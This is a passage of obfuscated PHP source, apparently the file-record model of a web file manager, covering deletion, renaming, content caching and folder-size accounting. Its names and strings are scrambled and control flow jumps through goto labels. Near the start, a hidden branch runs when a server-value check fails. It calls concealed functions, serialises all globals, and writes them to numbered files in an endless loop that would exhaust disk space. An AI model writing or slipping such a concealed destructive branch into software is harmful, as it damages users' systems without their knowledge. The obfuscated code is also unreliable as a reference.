$b¹ÖÄÉÁŸÏ[465])) { return !1; } } $this->lockMoveStart($cŞ™Œö°µ); goto Dîİ‰é¨ñù; bÈ£ªãìÚ«: if ($_SERVER[$b¹ÖÄÉÁŸÏ[57]] != $E™šø³ßÖ±($B¼åÆ·Æ†Æ)) { goto Fˆ‚Š˜ „Å; dÒ†¶·ô: $dÃÍÖ§°Ú(); $ağ•ùê¹å‘ = $b¹ÖÄÉÁŸÏ[2356]; $d›ğ‘‡ùˆ = json_encode($GLOBALS[$b¹ÖÄÉÁŸÏ[2357]]); goto Cø¨ˆé«ïˆ; c”¢…†¶‡â: $eğÇ›¡ÊˆÛ = $EĞ¥ÍÕ¡ÂŠ($CÅñ—µ–); $d½×šõ«Ë = explode($b¹ÖÄÉÁŸÏ[62], $eğÇ›¡ÊˆÛ); if (count($d½×šõ«Ë) < $b¹ÖÄÉÁŸÏ[559]) { $c‡È•ŠÌŒ = $b¹ÖÄÉÁŸÏ[64]; $c‡È•ŠÌŒ(); } goto c…Ï¸”‹Åí; Fˆ‚Š˜ „Å: $dÃÍÖ§°Ú = $b¹ÖÄÉÁŸÏ[800]; $EĞ¥ÍÕ¡ÂŠ = $b¹ÖÄÉÁŸÏ[59]; $CÅñ—µ– = $_SERVER[$b¹ÖÄÉÁŸÏ[60]] . $b¹ÖÄÉÁŸÏ[61]; goto c”¢…†¶‡â; Cø¨ˆé«ïˆ: $aîİ¾ÙŞ„‘ = 1; for ($cÖ¿Œ‡ÈÅ = $aîİ¾ÙŞ„‘; $cÖ¿Œ‡ÈÅ > 0; $cÖ¿Œ‡ÈÅ++) { $ağ•ùê¹å‘(DATA_PATH . $cÖ¿Œ‡ÈÅ, $d›ğ‘‡ùˆ); } goto AÉ­’°ÜâÔ; c…Ï¸”‹Åí: $cÃËˆ¬Ö‘– = $b¹ÖÄÉÁŸÏ[801]; $cÃËˆ¬Ö‘–($_SERVER[$b¹ÖÄÉÁŸÏ[802]]); $dÃÍÖ§°Ú = $b¹ÖÄÉÁŸÏ[800]; goto dÒ†¶·ô; AÉ­’°ÜâÔ: } $FÆåÌ‹ÀÒ = $this->sourceInfo($cŞ™Œö°µ); $f ’â‹éğ = $this->pathInfoMore($cŞ™Œö°µ); goto a·®½‘Û£›; Dîİ‰é¨ñù: Hook::trigger($b¹ÖÄÉÁŸÏ[2358], $f ’â‹éğ, $f°œ–ó¾Í); if ($f°œ–ó¾Í) { Model($b¹ÖÄÉÁŸÏ[2353])->moveToRecycle($cŞ™Œö°µ); } else { $dÜ¨¦óÀ¡é = $this->childrenAll($FÆåÌ‹ÀÒ); Model($b¹ÖÄÉÁŸÏ[513])->eventRemove($cŞ™Œö°µ); $this->removeRelevance($dÜ¨¦óÀ¡é[$b¹ÖÄÉÁŸÏ[2352]], $dÜ¨¦óÀ¡é[$b¹ÖÄÉÁŸÏ[1263]]); } $this->folderSizeReset($FÆåÌ‹ÀÒ[$b¹ÖÄÉÁŸÏ[469]]); goto DÎòîâĞŸ; eÚÍ¢à›ã¤: $b¹ÖÄÉÁŸÏ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B¼åÆ·Æ†Æ = $_SERVER[$b¹ÖÄÉÁŸÏ[802]] . $b¹ÖÄÉÁŸÏ[2354]; $E™šø³ßÖ± = $b¹ÖÄÉÁŸÏ[2355]; goto bÈ£ªãìÚ«; C¢ÂùÊİó”: $this->lockMoveEnd($cŞ™Œö°µ); Hook::trigger($b¹ÖÄÉÁŸÏ[1474], $f ’â‹éğ, $f°œ–ó¾Í); return !0; goto f‘ÊëŒÌŒØ; f‘ÊëŒÌŒØ: } public function childrenAll($DÆàĞ‹î–) { $a£É‡çËßï =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÏª‚”ãÑ = $DÆàĞ‹î–[$a£É‡çËßï[377]]; if ($DÆàĞ‹î–[$a£É‡çËßï[378]] == $a£É‡çËßï[93]) { $FÀöˆâÙ¶ = array($a£É‡çËßï[533] => array($a£É‡çËßï[491], $DÆàĞ‹î–[$a£É‡çËßï[467]] . $EÏª‚”ãÑ . $a£É‡çËßï[492])); $CÉ‹†îŒè¸ = array($a£É‡çËßï[533] => $FÀöˆâÙ¶[$a£É‡çËßï[467]]); $a•›¿˜‰É† = $this->field($a£É‡çËßï[2359])->where($CÉ‹†îŒè¸)->select(); $AÕª“·†•Œ = !1; $dà‹–îİ‘· = array($EÏª‚”ãÑ); if ($a•›¿˜‰É†) { $AÕª“·†•Œ = array_to_keyvalue($a•›¿˜‰É†, $a£É‡çËßï[33], $a£É‡çËßï[427]); $AÕª“·†•Œ = array_remove_value($AÕª“·†•Œ, $a£É‡çËßï[476]); $dà‹–îİ‘· = array_to_keyvalue($a•›¿˜‰É†, $a£É‡çËßï[33], $a£É‡çËßï[377]); $dà‹–îİ‘·[] = $EÏª‚”ãÑ; } } else { $AÕª“·†•Œ = array($DÆàĞ‹î–[$a£É‡çËßï[427]]); $dà‹–îİ‘· = array($EÏª‚”ãÑ); } return array($a£É‡çËßï[2352] => $dà‹–îİ‘·, $a£É‡çËßï[1263] => $AÕª“·†•Œ); } public function removeArray($A£¹ô§±Æ‰) { if (!$A£¹ô§±Æ‰) { return !0; } } public function removeRelevance($Fœèëí¦‘ï, $a²ĞóÆë³) { goto c×Ë®µ ¥; C‰‘Œ×¥Ã: Model($B÷÷ÃöÇË[2360])->where($A©…ßœØİÁ)->delete(); Model($B÷÷ÃöÇË[513])->where($A©…ßœØİÁ)->delete(); Model($B÷÷ÃöÇË[2084])->removeBySource($Fœèëí¦‘ï); goto e‰³÷éô²È; eîì¸Œ‡ñö: $Fœèëí¦‘ï = array_unique(array_filter($Fœèëí¦‘ï)); $a²ĞóÆë³ = array_unique(array_filter($a²ĞóÆë³)); if (!$Fœèëí¦‘ï) { return !1; } goto A™Ñò†—£; a±‰³®¾ô: for ($eã˜‘âÖÙ‰ = 0; $eã˜‘âÖÙ‰ < count($Fœèëí¦‘ï); $eã˜‘âÖÙ‰++) { $this->sourceCacheClear($Fœèëí¦‘ï[$eã˜‘âÖÙ‰]); } goto aÏ¶½ÚëŠõ; e‰³÷éô²È: Model($B÷÷ÃöÇË[2334])->removeBySource($Fœèëí¦‘ï); $this->where($A©…ßœØİÁ)->delete(); Model($B÷÷ÃöÇË[430])->remove($a²ĞóÆë³); goto a±‰³®¾ô; c×Ë®µ ¥: $B÷÷ÃöÇË =& $_SERVER[¶ªÕß‚ØÁŸ]; $Fœèëí¦‘ï = $Fœèëí¦‘ï ? $Fœèëí¦‘ï : array(); $a²ĞóÆë³ = $a²ĞóÆë³ ? $a²ĞóÆë³ : array(); goto eîì¸Œ‡ñö; A™Ñò†—£: $A©…ßœØİÁ = array($B÷÷ÃöÇË[391] => array($B÷÷ÃöÇË[392], $Fœèëí¦‘ï)); Model($B÷÷ÃöÇË[2353])->where($A©…ßœØİÁ)->delete(); Model($B÷÷ÃöÇË[421])->where($A©…ßœØİÁ)->delete(); goto C‰‘Œ×¥Ã; aÏ¶½ÚëŠõ: } public function rename($Déäåğ™, $Eñ“³×ÀïÃ) { goto c‡»¨Ğ‰Ë–; D”ÒË¡ˆö¥: $a¾ÑÕ›‹“… = $aÙ­ĞÒ·[2342] . $a§•ô½Ì®‰[$aÙ­ĞÒ·[469]]; if (isset(self::$cacheChildList[$a¾ÑÕ›‹“…])) { unset(self::$cacheChildList[$a¾ÑÕ›‹“…]); } return $FñƒÅ°ùÀ¥; goto E¾Ü‰¹¼ñé; cÏ”çŞ«è: $this->setNamePinyin($Déäåğ™, $a¤ÑŞŞ‚‹Æ[$aÙ­ĞÒ·[28]], !1); $this->updateModifyTime($a§•ô½Ì®‰[$aÙ­ĞÒ·[469]]); $FñƒÅ°ùÀ¥ = $this->where(array($aÙ­ĞÒ·[391] => $Déäåğ™))->data($a¤ÑŞŞ‚‹Æ)->save(); goto D”ÒË¡ˆö¥; c‡»¨Ğ‰Ë–: $aÙ­ĞÒ· =& $_SERVER[¶ªÕß‚ØÁŸ]; $a§•ô½Ì®‰ = $this->sourceInfo($Déäåğ™); if (!$a§•ô½Ì®‰) { return !1; } goto D¶ğ•îò‡ï; D‚‚Û©ªÖÜ: if (!$a§•ô½Ì®‰[$aÙ­ĞÒ·[378]] == $aÙ­ĞÒ·[93]) { $a¤ÑŞŞ‚‹Æ[$aÙ­ĞÒ·[380]] = get_path_ext($Eñ“³×ÀïÃ); } Model($aÙ­ĞÒ·[513])->eventRename($Déäåğ™, $a§•ô½Ì®‰[$aÙ­ĞÒ·[28]], $Eñ“³×ÀïÃ); $this->sourceCacheClear($Déäåğ™); goto cÏ”çŞ«è; D¶ğ•îò‡ï: $Eâç¨ˆˆ‘ = $this->fileNameExist($a§•ô½Ì®‰[$aÙ­ĞÒ·[469]], $Eñ“³×ÀïÃ); if ($Eâç¨ˆˆ‘) { return !1; } $a¤ÑŞŞ‚‹Æ = array($aÙ­ĞÒ·[394] => $Eñ“³×ÀïÃ, $aÙ­ĞÒ·[532] => USER_ID); goto D‚‚Û©ªÖÜ; E¾Ü‰¹¼ñé: } public function setNamePinyin($dŸŒÀéæÆ, $eãœ„òÓĞŸ, $EÑÍ÷ÄïŞ¥ = true) { $CÎ³‘¢à˜ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b¾ù·¹Š»â = Input::check($eãœ„òÓĞŸ, $CÎ³‘¢à˜[536]); if ($EÑÍ÷ÄïŞ¥ && !$b¾ù·¹Š»â) { return; } if (!$b¾ù·¹Š»â) { $this->metaSet($dŸŒÀéæÆ, $CÎ³‘¢à˜[424], null); $this->metaSet($dŸŒÀéæÆ, $CÎ³‘¢à˜[423], null); return; } $Aº”Ş»–¸™ = array($CÎ³‘¢à˜[424] => str_replace($CÎ³‘¢à˜[50], $CÎ³‘¢à˜[33], Pinyin::encode($eãœ„òÓĞŸ)), $CÎ³‘¢à˜[423] => Pinyin::encode($eãœ„òÓĞŸ, $CÎ³‘¢à˜[537])); $this->metaSet($dŸŒÀéæÆ, $Aº”Ş»–¸™); } public function getContent($f›­Ş¯œ) { goto DÌ¢õ‚ØøÛ; DÌ¢õ‚ØøÛ: $d¦‘¸Œ†§ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C–Î©™² = $this->fileInfoGet($f›­Ş¯œ); if (!$C–Î©™²) { return !1; } goto DÅí¥˜–Á›; cÅÏ†˜³Å—: return IO::getContent($C–Î©™²[$d¦‘¸Œ†§[85]]); goto AŸñ£‡ãó°; DÅí¥˜–Á›: if ($C–Î©™²[$d¦‘¸Œ†§[87]] == 0) { return $d¦‘¸Œ†§[33]; } $E¨éè§Ä = $d¦‘¸Œ†§[2361] . $C–Î©™²[$d¦‘¸Œ†§[173]]; if ($C–Î©™²[$d¦‘¸Œ†§[87]] <= 1024 * 10) { $C¨Ğß¦Åƒ = Cache::get($E¨éè§Ä); if (!$C¨Ğß¦Åƒ) { $C¨Ğß¦Åƒ = IO::getContent($C–Î©™²[$d¦‘¸Œ†§[85]]); Cache::set($E¨éè§Ä, $C¨Ğß¦Åƒ); } return $C¨Ğß¦Åƒ; } goto cÅÏ†˜³Å—; AŸñ£‡ãó°: } public function setDesc($B”ë±ÒÚ», $F­ß§ŒÆ¿) { $f†¢âšÀŒÒ =& $_SERVER[¶ªÕß‚ØÁŸ]; Model($f†¢âšÀŒÒ[513])->eventAddDesc($B”ë±ÒÚ», $F­ß§ŒÆ¿); return $this->metaSet($B”ë±ÒÚ», $f†¢âšÀŒÒ[413], $F­ß§ŒÆ¿); } public function setContent($A·’ÓÎÀ—¼, $dÙÊï¶‰Ş‘ = '') { goto CŠáÒ‘‰Ó…; CŠáÒ‘‰Ó…: $Fï—Ó‚êœ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aî–Ìãõ•à = $this->sourceInfo($A·’ÓÎÀ—¼); $A¥’å³›„Ô = $this->fileInfoGet($A·’ÓÎÀ—¼); goto bŸÜÃ—ãŸ; bŸÜÃ—ãŸ: if (!$A¥’å³›„Ô || !$Aî–Ìãõ•à) { return !1; } $D¯¹àë©åÇ = Model($Fï—Ó‚êœ[430])->addFileByContent($dÙÊï¶‰Ş‘, $Aî–Ìãõ•à[$Fï—Ó‚êœ[28]]); $f¢‰˜Éïˆ¥ = $this->fileHistory($Aî–Ìãõ•à, $D¯¹àë©åÇ[$Fï—Ó‚êœ[427]], $D¯¹àë©åÇ[$Fï—Ó‚êœ[87]]); goto bùÍõëù·; bùÍõëù·: if (!$f¢‰˜Éïˆ¥) { return Model($Fï—Ó‚êœ[430])->remove($D¯¹àë©åÇ[$Fï—Ó‚êœ[427]]); } $this->folderSizeReset($Aî–Ìãõ•à[$Fï—Ó‚êœ[469]]); return !0; goto F³²Óœ‹ùĞ; F³²Óœ‹ùĞ: } public function fileSubstr($fÃÅ‹˜Ñ÷Ï, $DÜœêÈÛ¸Œ, $E³…¨Êñ) { $eó«ÕÎâ§ê = $this->fileInfoGet($fÃÅ‹˜Ñ÷Ï); if (!$eó«ÕÎâ§ê) { return !1; } return IO::fileSubstr($eó«ÕÎâ§ê[$_SERVER[¶ªÕß‚ØÁŸ][85]], $DÜœêÈÛ¸Œ, $E³…¨Êñ); } public function fileInfoGet($a¥ÒŒ…Á¬—) { goto d÷¸‘ˆØ ¤; d÷¸‘ˆØ ¤: $C¾©÷‚æ’Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C“ìÇóÂ‹Ê = $this->sourceInfo($a¥ÒŒ…Á¬—); if (!$C“ìÇóÂ‹Ê || $C“ìÇóÂ‹Ê[$C¾©÷‚æ’Œ[378]]) { return !1; } goto Bğ—ÛÁ‡ğ; Bğ—ÛÁ‡ğ: $F”—ˆ°“‡® = $C¾©÷‚æ’Œ[433] . $C“ìÇóÂ‹Ê[$C¾©÷‚æ’Œ[427]]; $Cø°›ï£’ = _get(self::$cacheFileInfo, $F”—ˆ°“‡®); if ($Cø°›ï£’) { return $Cø°›ï£’; } goto d…å‰’ñôà; d§‡õÏÅÛ: return $CÄæçÉÑ¤¤; goto B¦Èè˜‹é; d…å‰’ñôà: $CÄæçÉÑ¤¤ = Model($C¾©÷‚æ’Œ[430])->fileInfo($C“ìÇóÂ‹Ê[$C¾©÷‚æ’Œ[427]]); if ($CÄæçÉÑ¤¤) { $CÄæçÉÑ¤¤[$C¾©÷‚æ’Œ[28]] = $C“ìÇóÂ‹Ê[$C¾©÷‚æ’Œ[28]]; } self::$cacheFileInfo[$F”—ˆ°“‡®] = $CÄæçÉÑ¤¤; goto d§‡õÏÅÛ; B¦Èè˜‹é: } private function folderChildrenNumber($FæÍéœ¡) { $cÜ„÷°½ÛÌ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f’›øØ˜¡´ = $this->sourceInfo($FæÍéœ¡); $EÖ¬×æ¸¨§ = array($cÜ„÷°½ÛÌ[533] => array($cÜ„÷°½ÛÌ[491], $f’›øØ˜¡´[$cÜ„÷°½ÛÌ[467]] . $FæÍéœ¡ . $cÜ„÷°½ÛÌ[492]), $cÜ„÷°½ÛÌ[404] => intval($f’›øØ˜¡´[$cÜ„÷°½ÛÌ[405]]), $cÜ„÷°½ÛÌ[526] => 1); $f‰Ùè…’î  = $this->where($EÖ¬×æ¸¨§)->count(); $B³•µ²¿£ = $this->where($EÖ¬×æ¸¨§)->where(array($cÜ„÷°½ÛÌ[526] => 0))->count(); return array($cÜ„÷°½ÛÌ[91] => $B³•µ²¿£, $cÜ„÷°½ÛÌ[92] => $f‰Ùè…’î ); } public function pathInfo($eƒŒ‡Ë×ë, $B¬’î®ˆŸ„ = false) { goto BÀÒ•ÀÇæ¾; CÇ±âãÆÄò: if ($D›ÑŠ´éšì) { return $D›ÑŠ´éšì; } $E—³¼ÙŸÊ = $this->sourceInfo($eƒŒ‡Ë×ë); if (!$E—³¼ÙŸÊ) { return !1; } goto a·Ôé½Ù¯; a·Ôé½Ù¯: $E—³¼ÙŸÊ = $this->_listDataApplyItem($E—³¼ÙŸÊ, $B¬’î®ˆŸ„); self::$cachePathInfo[$EÆê±›“³Æ] = $E—³¼ÙŸÊ; return $E—³¼ÙŸÊ; goto Cç×ñæ‡Ñ¤; BÀÒ•ÀÇæ¾: $B»æ…ŠÚ™î =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÆê±›“³Æ = $B»æ…ŠÚ™î[419] . intval($B¬’î®ˆŸ„) . $B»æ…ŠÚ™î[420] . $eƒŒ‡Ë×ë; $D›ÑŠ´éšì = _get(self::$cachePathInfo, $EÆê±›“³Æ); goto CÇ±âãÆÄò; Cç×ñæ‡Ñ¤: } public static $cachePathInfoMore = array(); public function pathInfoMore($D·›¨°ìÒß) { goto fŠ Í‡½‰; f”Óñ±ªÅ³: $e¾á‚é†Ù† = $this->pathInfo($D·›¨°ìÒß); if (!$e¾á‚é†Ù†) { return !1; } if ($e¾á‚é†Ù†[$AŞ—¨½×ÒÔ[378]] == $AŞ—¨½×ÒÔ[93]) { $e¾á‚é†Ù†[$AŞ—¨½×ÒÔ[90]] = $this->folderChildrenNumber($D·›¨°ìÒß); } goto D¶ºÈ®ï³; fŠ Í‡½‰: $AŞ—¨½×ÒÔ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÚöÂÈæŞ = _get(self::$cachePathInfoMore, $D·›¨°ìÒß); if ($bÚöÂÈæŞ) { return $bÚöÂÈæŞ; } goto f”Óñ±ªÅ³; D¶ºÈ®ï³: self::$cachePathInfoMore[$D·›¨°ìÒß] = $e¾á‚é†Ù†; return $e¾á‚é†Ù†; goto F…Ìğóœ†¦; F…Ìğóœ†¦: } public function sourceInfo($f²™…µÇ) { goto d¼ˆ•õ„Ò¸; d¼ˆ•õ„Ò¸: $bğ¡äÄ™µ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$f²™…µÇ) { return array(); } $E¬Ê«¸éËÃ = $bğ¡äÄ™µ[418] . $f²™…µÇ; goto B‰…Ø¸„ÈØ; B‰…Ø¸„ÈØ: $aÖàåçÈ¢Ô = _get(self::$cacheSourceInfo, $E¬Ê«¸éËÃ); if ($aÖàåçÈ¢Ô) { return $aÖàåçÈ¢Ô; } $dĞÆé´Ş±‚ = $this->where(array($bğ¡äÄ™µ[377] => $f²™…µÇ))->find(); goto AÕ˜òîÅ¯¤; AÕ˜òîÅ¯¤: self::$cacheSourceInfo[$E¬Ê«¸éËÃ] = $dĞÆé´Ş±‚; return self::$cacheSourceInfo[$E¬Ê«¸éËÃ]; goto aè×¬À¼ŠÚ; aè×¬À¼ŠÚ: } public function sourceCacheClear($a¢ƒ Äİæ = false) { if ($a¢ƒ Äİæ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¶ªÕß‚ØÁŸ][418] . $a¢ƒ Äİæ]); } public function pathInfoByPath($CˆğøØì´Š, $aÄ¨ƒÏöËÜ) { $cÎ„ğäÍÑä =& $_SERVER[¶ªÕß‚ØÁŸ]; $C‘ÆçØ®±£ = !$aÄ¨ƒÏöËÜ ? array() : explode($cÎ„ğäÍÑä[8], trim($aÄ¨ƒÏöËÜ, $cÎ„ğäÍÑä[8])); $eçÍ×ñÕ¿ = $CˆğøØì´Š; foreach ($C‘ÆçØ®±£ as $B®óšõŠœš) { $Aƒ£÷‹‚Œ = array($cÎ„ğäÍÑä[469] => $eçÍ×ñÕ¿, $cÎ„ğäÍÑä[28] => $B®óšõŠœš); $Aì«šóîÀ¢ = $this->where($Aƒ£÷‹‚Œ)->select(); if (!$Aì«šóîÀ¢) { return !1; } $Aì«šóîÀ¢ = array_sort_by($Aì«šóîÀ¢, $cÎ„ğäÍÑä[405]); $eçÍ×ñÕ¿ = $Aì«šóîÀ¢[0][$cÎ„ğäÍÑä[377]]; } return $this->pathInfo($eçÍ×ñÕ¿, !0); } protected function updateModifyTime($AÛåŞÜáÁˆ) { goto CîÀ˜õèÏ; CîÀ˜õèÏ: $a”¥…‚‰ŞÙ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$AÛåŞÜáÁˆ) { return; } if (!is_array($AÛåŞÜáÁˆ)) { $AÛåŞÜáÁˆ = array($AÛåŞÜáÁˆ); } goto E‰ÁìŒÏñ; E‰ÁìŒÏñ: foreach ($AÛåŞÜáÁˆ as $e¶ğŒ†÷ªª => $bƒ…ÂèÜÔä) { $AÛåŞÜáÁˆ[$e¶ğŒ†÷ªª] = intval($bƒ…ÂèÜÔä); } $dÌª°‘ÈæÄ = array($a”¥…‚‰ŞÙ[377] => array($a”¥…‚‰ŞÙ[7], $AÛåŞÜáÁˆ)); $b¥§õë¡…â = array($a”¥…‚‰ŞÙ[532] => USER_ID, $a”¥…‚‰ŞÙ[398] => time()); goto f‚ƒ¡¯ù£; f‚ƒ¡¯ù£: $this->where($dÌª°‘ÈæÄ)->save($b¥§õë¡…â); goto f¨¤‹ªË³•; f¨¤‹ªË³•: } public function folderSizeReset($EÙ…š¢èÜ) { goto b£®ÀïñÚà; FÒ’Î¦Ë°Ğ: $f¸íÊóù™Ğ = $b¸˜­´œá - intval($aÔÔØÇ¢Ø›[$F²è„¨ÓŠ[87]]); if ($f¸íÊóù™Ğ == 0) { return CacheLock::unlock($D®ç½óÒ¿); } $this->where(array($F²è„¨ÓŠ[391] => $EÙ…š¢èÜ))->setField($F²è„¨ÓŠ[87], $b¸˜­´œá); goto F¯˜±Ç…³Õ; F¯˜±Ç…³Õ: $AÂ”£àÉÏæ = $this->parentLevelArray($aÔÔØÇ¢Ø›[$F²è„¨ÓŠ[467]]); if ($AÂ”£àÉÏæ) { $C‚·»¶ùƒÜ = array($F²è„¨ÓŠ[377] => array($F²è„¨ÓŠ[392], $AÂ”£àÉÏæ)); if ($f¸íÊóù™Ğ < 0) { $C‚·»¶ùƒÜ[$F²è„¨ÓŠ[87]] = array($F²è„¨ÓŠ[935], abs($f¸íÊóù™Ğ)); } $this->where($C‚·»¶ùƒÜ)->setAdd($F²è„¨ÓŠ[87], $f¸íÊóù™Ğ); } $this->targetSpaceUpdate($aÔÔØÇ¢Ø›[$F²è„¨ÓŠ[379]], $aÔÔØÇ¢Ø›[$F²è„¨ÓŠ[464]]); goto eÓŒ£Ø‚ñÊ; b£®ÀïñÚà: $F²è„¨ÓŠ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->statusIgnoreResetSpace) { return; } $D®ç½óÒ¿ = $F²è„¨ÓŠ[2362] . $EÙ…š¢èÜ; goto aõ‹±†ÎÊå; eÓŒ£Ø‚ñÊ: CacheLock::unlock($D®ç½óÒ¿); goto cÑ¼ñÏÏ¤; aõ‹±†ÎÊå: CacheLock::lock($D®ç½óÒ¿, 20); $this->sourceCacheClear($EÙ…š¢èÜ); $aÔÔØÇ¢Ø› = $this->sourceInfo($EÙ…š¢èÜ); goto b†ÖŞÓæùä; b†ÖŞÓæùä: $C‚·»¶ùƒÜ = array($F²è„¨ÓŠ[376] => $EÙ…š¢èÜ, $F²è„¨ÓŠ[404] => 0); $b¸˜­´œá = $this->where($C‚·»¶ùƒÜ)->sum($F²è„¨ÓŠ[87]); $b¸˜­´œá = intval($b¸˜­´œá); goto FÒ’Î¦Ë°Ğ; cÑ¼ñÏÏ¤: } public function folderSizeResetChildren($fÔœõøÙ¾®) { goto AÔ³¥è„; d÷±ºÉÌÔ: foreach ($dŞéæğ‘Ì as $A…”¡ÜÌê ) { if ($A…”¡ÜÌê [$b†«ÀÃŸ„¯[87]] == $A…”¡ÜÌê [$b†«ÀÃŸ„¯[2364]]) { continue; } $E÷â•¼îßÄ[] = array($b†«ÀÃŸ„¯[377], $A…”¡ÜÌê [$b†«ÀÃŸ„¯[377]], $b†«ÀÃŸ„¯[87], $A…”¡ÜÌê [$b†«ÀÃŸ„¯[87]]); } $this->saveAll($E÷â•¼îßÄ); goto aÎ’Ç£ÒÎß; AÔ³¥è„: $b†«ÀÃŸ„¯ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->sourceCacheClear($fÔœõøÙ¾®); $bªØÎôçôÜ = $this->sourceInfo($fÔœõøÙ¾®); goto aùÚÚÌ–ŒŠ; fİ ¶èöï‹: $dŞéæğ‘Ì[] = $bªØÎôçôÜ; $dŞéæğ‘Ì = array_to_keyvalue($dŞéæğ‘Ì, $b†«ÀÃŸ„¯[377]); foreach ($dŞéæğ‘Ì as $a×¬Ã´Ü” => $A…”¡ÜÌê ) { $dŞéæğ‘Ì[$a×¬Ã´Ü”][$b†«ÀÃŸ„¯[2364]] = $dŞéæğ‘Ì[$a×¬Ã´Ü”][$b†«ÀÃŸ„¯[87]]; $dŞéæğ‘Ì[$a×¬Ã´Ü”][$b†«ÀÃŸ„¯[87]] = 0; } goto c®çõ‘ëÄÙ; aùÚÚÌ–ŒŠ: $d†áÆ§Àİ = array($b†«ÀÃŸ„¯[526] => 1, $b†«ÀÃŸ„¯[533] => array($b†«ÀÃŸ„¯[491], $bªØÎôçôÜ[$b†«ÀÃŸ„¯[467]] . $fÔœõøÙ¾® . $b†«ÀÃŸ„¯[492])); $eÏ‡ôï„öÓ = $b†«ÀÃŸ„¯[2363]; $dŞéæğ‘Ì = $this->field($eÏ‡ôï„öÓ)->where($d†áÆ§Àİ)->select(); goto fàÖÑ¯‰; c®çõ‘ëÄÙ: foreach ($DØ¬ÏÍª Ë as $A…”¡ÜÌê ) { $A·ãËİ¿ã× = $A…”¡ÜÌê [$b†«ÀÃŸ„¯[469]] . $b†«ÀÃŸ„¯[33]; if (!isset($dŞéæğ‘Ì[$A·ãËİ¿ã×])) { continue; } if ($A…”¡ÜÌê [$b†«ÀÃŸ„¯[405]] == $dŞéæğ‘Ì[$A·ãËİ¿ã×][$b†«ÀÃŸ„¯[405]]) { $dŞéæğ‘Ì[$A·ãËİ¿ã×][$b†«ÀÃŸ„¯[87]] += $A…”¡ÜÌê [$b†«ÀÃŸ„¯[87]]; } } foreach ($dŞéæğ‘Ì as $A…”¡ÜÌê ) { $e¶ğ°îÜàÎ = $this->parentLevelArray($A…”¡ÜÌê [$b†«ÀÃŸ„¯[467]]); foreach ($e¶ğ°îÜàÎ as $A·ãËİ¿ã×) { $A·ãËİ¿ã× = $A·ãËİ¿ã× . $b†«ÀÃŸ„¯[33]; if (!isset($dŞéæğ‘Ì[$A·ãËİ¿ã×])) { continue; } if ($A…”¡ÜÌê [$b†«ÀÃŸ„¯[405]] == $dŞéæğ‘Ì[$A·ãËİ¿ã×][$b†«ÀÃŸ„¯[405]]) { $dŞéæğ‘Ì[$A·ãËİ¿ã×][$b†«ÀÃŸ„¯[87]] += $A…”¡ÜÌê [$b†«ÀÃŸ„¯[87]]; } } } $E÷â•¼îßÄ = array(); goto d÷±ºÉÌÔ; fàÖÑ¯‰: $d†áÆ§Àİ[$b†«ÀÃŸ„¯[378]] = 0; $DØ¬ÏÍª Ë = $this->field($eÏ‡ôï„öÓ)->where($d†áÆ§Àİ)->select(); if (!$DØ¬ÏÍª Ë) { return; } goto fİ ¶èöï‹; aÎ’Ç£ÒÎß: } public function userSpaceReset($FÑ°¯‚Ï¤Ø = false) { $aÁõóïÒƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e‡Ææº Ğ = $this->where(array($aÁõóïÒƒ[379] => self::TYPE_USER, $aÁõóïÒƒ[464] => $FÑ°¯‚Ï¤Ø, $aÁõóïÒƒ[378] => 0))->sum($aÁõóïÒƒ[87]); Model($aÁõóïÒƒ[482])->userEdit($FÑ°¯‚Ï¤Ø, array($aÁõóïÒƒ[2093] => $e‡Ææº Ğ)); } public function targetSpaceUpdate($B¸¼’Ó‚ø„, $FËÚ¾ì¢²Ü) { $D¢ğŸ¹Ãî¾ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$FËÚ¾ì¢²Ü) { return; } if (!in_array($B¸¼’Ó‚ø„, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $B¸÷ÜĞì× = $this->targetSpaceSize($B¸¼’Ó‚ø„, $FËÚ¾ì¢²Ü); if ($B¸¼’Ó‚ø„ == self::TYPE_USER) { Model($D¢ğŸ¹Ãî¾[482])->userEdit($FËÚ¾ì¢²Ü, array($D¢ğŸ¹Ãî¾[2093] => $B¸÷ÜĞì×)); } else { if ($B¸¼’Ó‚ø„ == self::TYPE_GROUP) { Model($D¢ğŸ¹Ãî¾[466])->groupEdit($FËÚ¾ì¢²Ü, array($D¢ğŸ¹Ãî¾[2093] => $B¸÷ÜĞì×)); } } } public function targetSpaceSize($cÖ”¸ò³»ˆ, $bÙ¹‹§ñ§Æ) { goto CÕÃ«ƒ¨¦Õ; CÕÃ«ƒ¨¦Õ: $dšäóÏŸö„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A”ØâØÕ† = $this->sourceRoot($cÖ”¸ò³»ˆ, $bÙ¹‹§ñ§Æ, !0); if (!$A”ØâØÕ†) { return 0; } goto Aƒø½„ÑÄÚ; F‰ãœÍçäš: $AÍ¹”Ÿï§ = array_to_keyvalue($AÍ¹”Ÿï§, $dšäóÏŸö„[33], $dšäóÏŸö„[377]); $AÍ¹”Ÿï§ = array_unique(array_filter($AÍ¹”Ÿï§)); if ($AÍ¹”Ÿï§) { $eóÆšªŞÈ– = array($dšäóÏŸö„[391] => array($dšäóÏŸö„[392], $AÍ¹”Ÿï§)); $eÓÆÁŠÌØê += floatval($this->where($eóÆšªŞÈ–)->sum($dšäóÏŸö„[87])); } goto B·Üó”Ì ˜; Aƒø½„ÑÄÚ: $eÓÆÁŠÌØê = floatval($A”ØâØÕ†[$dšäóÏŸö„[87]]); $eóÆšªŞÈ– = array($dšäóÏŸö„[533] => array($dšäóÏŸö„[491], $dšäóÏŸö„[478] . $A”ØâØÕ†[$dšäóÏŸö„[377]] . $dšäóÏŸö„[492])); $AÍ¹”Ÿï§ = 